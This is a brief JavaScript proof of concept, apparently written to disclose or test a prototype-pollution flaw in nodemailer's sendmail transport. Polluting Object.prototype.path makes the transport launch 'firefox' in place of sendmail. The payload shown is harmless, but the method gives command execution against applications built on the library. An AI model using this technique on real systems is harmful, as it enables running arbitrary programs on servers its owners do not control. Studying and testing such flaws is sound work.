const SendmailTransport = require('nodemailer/lib/sendmail-transport');
const MailComposer = require('nodemailer/lib/mail-composer');

Object.prototype.path = 'firefox';
let client = new SendmailTransport();

const message = new MailComposer().compile();
client.send({data: {}, message});